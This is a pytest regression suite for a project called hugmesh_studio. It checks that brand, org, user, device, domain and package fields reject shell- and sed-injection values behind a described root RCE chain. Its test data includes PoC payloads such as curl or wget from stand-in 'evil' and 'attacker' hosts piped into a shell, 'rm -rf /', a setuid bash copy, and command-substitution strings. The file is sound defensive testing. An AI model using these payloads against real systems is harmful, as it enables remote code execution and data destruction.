"""Regression tests for identity-field injection hardening.

Covers the confirmed root-RCE chain where untrusted identity values
(brand/org/domain/local_user/home_device/brand_title) flow from a key-zip
domain.conf or the wizard into --brand/--org/--local-user/--home-* and are then
written into a root-sourced brand.conf/home.conf or a sed replacement by the
generator. The Studio MUST reject (fail-closed) injection-shaped values and let
legitimate values pass.
"""
import os

import pytest

from hugmesh_studio.core import keyzip
from hugmesh_studio.core.config import Domain, ImageConfig
from hugmesh_studio.core.validate import (
    IdentityValidationError,
    validate_accent_color,
    validate_brand,
    validate_domain_name,
    validate_home_backup,
    validate_home_device,
    validate_org,
    validate_package_atoms,
    validate_username,
)


# ---- ImageConfig.to_cli_args() validates identity fields -------------------

def test_clean_defaults_pass():
    """The committed defaults (brand snap-class, org Snapdragon-Systems, user, domain)
    must still produce a CLI arg list without raising."""
    cfg = ImageConfig(brand="hugmesh", org="Snapdragon-Systems",
                      brand_title="HugMesh Systems",
                      cluster_domain="hugmesh.systems", local_user="snap")
    args = cfg.to_cli_args()
    assert "--local-user" in args and "snap" in args


def test_clean_custom_brand_passes():
    cfg = ImageConfig(brand="acme", org="Acme-Corp", brand_title="Acme Corp",
                      cluster_domain="acme.test", local_user="magus")
    args = cfg.to_cli_args()
    assert "--brand" in args and "acme" in args


@pytest.mark.parametrize("brand", [
    'x"; curl http://evil/s|bash; #',   # the confirmed PoC payload
    "a|d s/.*/PAYLOAD/",                # sed-delimiter injection
    "x&y",                             # sed & re-injection
    "UPPER",                          # not a lowercase DNS label (brand is a hostname slug)
    "../../etc/cron.d",               # path traversal
    "bad_underscore",                 # underscore not valid in a DNS label
    "",                                # empty
])
def test_injection_brand_rejected(brand):
    cfg = ImageConfig(brand=brand)
    with pytest.raises(IdentityValidationError):
        cfg.to_cli_args()


@pytest.mark.parametrize("org", [
    'x"; reboot; #',
    "a|d",
    "org with spaces",
    "../traversal",
])
def test_injection_org_rejected(org):
    cfg = ImageConfig(org=org)
    with pytest.raises(IdentityValidationError):
        cfg.to_cli_args()


@pytest.mark.parametrize("title", [
    'foo"; cp /bin/bash /tmp/r; chmod u+s /tmp/r; #',
    "$(curl evil|sh)",
    "back`tick`",
    "pipe|here",
    "amp&ersand",
    "new\nline",
])
def test_injection_brand_title_rejected(title):
    cfg = ImageConfig(brand_title=title)
    with pytest.raises(IdentityValidationError):
        cfg.to_cli_args()


def test_brand_title_allows_normal_spacing_and_punct():
    cfg = ImageConfig(brand_title="Acme Corp. Systems - 2026")
    cfg.to_cli_args()   # must not raise


@pytest.mark.parametrize("user", [
    "x; curl http://attacker/p|bash #",
    "x'y",                 # breaks the chpasswd single-quoting
    "1startsdigit",
    "Upper",
    "user name",
    "this_is_way_too_long_to_be_a_unix_login_name_really",
    "",
])
def test_injection_local_user_rejected(user):
    cfg = ImageConfig(local_user=user)
    with pytest.raises(IdentityValidationError):
        cfg.to_cli_args()


def test_clean_local_user_passes():
    for u in ("snap", "magus", "_svc", "user-1"):
        ImageConfig(local_user=u).to_cli_args()   # must not raise


@pytest.mark.parametrize("device", [
    'LABEL=x"; wget http://evil/x -O- | sh; HOME_DEVICE="',
    "$(reboot)",
    "/dev/sda1; rm -rf /",
    "plain-no-prefix",
])
def test_injection_home_device_rejected(device):
    cfg = ImageConfig(home_device=device)
    with pytest.raises(IdentityValidationError):
        cfg.to_cli_args()


def test_clean_home_device_passes():
    for d in ("LABEL=HOME", "UUID=1234-ABCD", "/dev/sda2", "PARTUUID=abcd-01"):
        ImageConfig(home_device=d).to_cli_args()   # must not raise


def test_injection_home_backup_rejected():
    cfg = ImageConfig(home_mode="restore",
                      home_backup="/b; rm -rf /; ")
    with pytest.raises(IdentityValidationError):
        cfg.to_cli_args()


def test_clean_home_backup_passes():
    for b in ("auto", "/mnt/usb/home-backup.tar.gz.enc"):
        ImageConfig(home_mode="restore", home_backup=b).to_cli_args()


@pytest.mark.parametrize("name", [
    "good.test,evil.test",   # comma injects an extra --domains entry
    'd"; reboot; #',
    "bad_label.test",
    "x|y.test",
])
def test_injection_domain_name_rejected(name):
    cfg = ImageConfig(mode="mesh", domains=[Domain(name=name)])
    with pytest.raises(IdentityValidationError):
        cfg.to_cli_args()


def test_clean_domain_names_pass():
    cfg = ImageConfig(mode="mesh",
                      domains=[Domain(name="a.test"), Domain(name="b.example.com")])
    args = cfg.to_cli_args()
    assert "--domains" in args and "a.test,b.example.com" in args


def test_injection_cluster_domain_rejected():
    cfg = ImageConfig(cluster_domain='x"; reboot; #')
    with pytest.raises(IdentityValidationError):
        cfg.to_cli_args()


# ---- trailing-newline is rejected (re.match -> re.fullmatch) --------------
# re.compile(r'^...$').match() accepts a single TRAILING NEWLINE because "$"
# matches just before a final "\n"; that newline would break out of a
# root-sourced KEY=VALUE line or a sed replacement. .fullmatch() rejects it.
# Each of the seven positive-identity validators must reject a "<legit>\n"
# variant while the plain legit value still passes.

_NEWLINE_CASES = [
    (validate_brand, "acme"),
    (validate_org, "Acme-Corp"),
    (validate_domain_name, "acme.test"),
    (validate_username, "snap"),
    (validate_home_device, "LABEL=HOME"),
    (validate_home_backup, "/mnt/usb/home-backup.tar.gz.enc"),
    (validate_accent_color, "#a1b2c3"),
]


@pytest.mark.parametrize("validator,legit", _NEWLINE_CASES,
                         ids=[v.__name__ for v, _ in _NEWLINE_CASES])
def test_trailing_newline_rejected(validator, legit):
    # the plain legit value passes unchanged...
    assert validator(legit) == legit
    # ...but a single trailing newline is fail-closed rejected.
    with pytest.raises(IdentityValidationError):
        validator(legit + "\n")


def test_accent_color_empty_still_passes():
    # "" (no accent) is still accepted; only a trailing newline is rejected.
    assert validate_accent_color("") == ""
    with pytest.raises(IdentityValidationError):
        validate_accent_color("\n")


# ---- keyzip._apply_domain_conf rejects (does not set) bad values ----------

def _write_domain_conf(tmp_path, body: str) -> str:
    p = os.path.join(str(tmp_path), "domain.conf")
    with open(p, "w", encoding="utf-8") as fh:
        fh.write(body)
    return p


def test_keyzip_domain_conf_injection_rejected(tmp_path):
    """The confirmed key-zip RCE: a malicious domain.conf must NOT set cfg.brand."""
    path = _write_domain_conf(
        tmp_path, 'BRAND="x"; curl http://evil/s|bash; #\n')
    cfg = ImageConfig(brand="hugmesh")
    warnings: list[str] = []
    keyzip._apply_domain_conf(path, cfg, warnings)
    assert cfg.brand == "hugmesh"          # original value preserved, not overwritten
    assert any("BRAND" in w for w in warnings)


def test_keyzip_domain_conf_clean_applies(tmp_path):
    path = _write_domain_conf(
        tmp_path,
        'BRAND=acme\nBRAND_TITLE="Acme Corp"\nORG=Acme-Corp\nCLUSTER_DOMAIN=acme.test\n')
    cfg = ImageConfig()
    warnings: list[str] = []
    keyzip._apply_domain_conf(path, cfg, warnings)
    assert cfg.brand == "acme"
    assert cfg.brand_title == "Acme Corp"
    assert cfg.org == "Acme-Corp"
    assert cfg.cluster_domain == "acme.test"
    assert warnings == []
    # the applied values must themselves survive the to_cli_args allowlist
    cfg.to_cli_args()


def test_keyzip_domain_conf_mixed(tmp_path):
    """A conf with one bad and one good field: keep the good, reject the bad."""
    path = _write_domain_conf(
        tmp_path, 'BRAND=acme\nORG="evil$(reboot)"\n')
    cfg = ImageConfig()
    warnings: list[str] = []
    keyzip._apply_domain_conf(path, cfg, warnings)
    assert cfg.brand == "acme"
    assert cfg.org == "Snapdragon-Systems"     # bad ORG rejected, default preserved
    assert any("ORG" in w for w in warnings)


def test_keyzip_domain_conf_json_injection_rejected(tmp_path):
    p = os.path.join(str(tmp_path), "domain.json")
    with open(p, "w", encoding="utf-8") as fh:
        fh.write('{"BRAND": "x; reboot"}')
    cfg = ImageConfig(brand="hugmesh")
    warnings: list[str] = []
    keyzip._apply_domain_conf(p, cfg, warnings)
    assert cfg.brand == "hugmesh"
    assert warnings


# ---- validate_package_atoms: shell-word-safe Portage atoms (packages_add/drop) ----

@pytest.mark.parametrize("atoms", [
    "",                                       # empty = no packages
    "app-editors/vim",
    "app-editors/vim app-misc/tmux dev-vcs/git",
    "sys-fs/ecryptfs-utils sys-apps/keyutils",
    "virtual/foo x11-libs/gtk+3",             # '+' legal
    "dev-libs/libFoo",                        # caps in the package name legal
    "cat.d/pkg_1.2-r3",                       # '.', '_', '-' legal
    "  app-editors/vim   dev-vcs/git  ",      # extra whitespace is just word separation
])
def test_validate_package_atoms_accepts(atoms):
    assert validate_package_atoms(atoms) == atoms


@pytest.mark.parametrize("bad", [
    "vim",                                    # no category/name slash
    "app-editors/vim; reboot",                # ';' shell metacharacter
    "app-editors/vim && curl evil|sh",
    "$(reboot)/pkg",
    "`id`/pkg",
    "app-editors/vim`id`",
    "app-editors/",                           # empty package name
    "/vim",                                   # empty category
    "App-Editors/vim",                        # uppercase category rejected
    "cat/pkg with spaces/inside",             # a word 'with' has no slash
])
def test_validate_package_atoms_rejects(bad):
    with pytest.raises(IdentityValidationError):
        validate_package_atoms(bad)


def test_validate_package_atoms_newline_word_rejected():
    # a genuine newline-carrying atom word must fail closed (would break a KEY=VALUE line)
    with pytest.raises(IdentityValidationError):
        validate_package_atoms("app-editors/vim\napp-misc/evil;reboot")


# ---- superdomain validation (.internal must be accepted; injection rejected) ------

def test_superdomain_internal_accepted_and_derived_valid():
    # an explicit <brand>.internal passes validate_identity; "" derives it (also valid)
    ImageConfig(mode="mesh", role="omnibus", superdomain="hugmesh.internal").to_cli_args()
    ImageConfig(mode="mesh", role="omnibus", brand="acme").to_cli_args()   # derived acme.internal


@pytest.mark.parametrize("bad", [
    'x"; reboot; #.internal',
    "a,b.internal",                # comma
    "bad_label.internal",          # underscore not a DNS label char
    "x|y.internal",
])
def test_superdomain_injection_rejected(bad):
    with pytest.raises(IdentityValidationError):
        ImageConfig(mode="mesh", role="omnibus", superdomain=bad).to_cli_args()
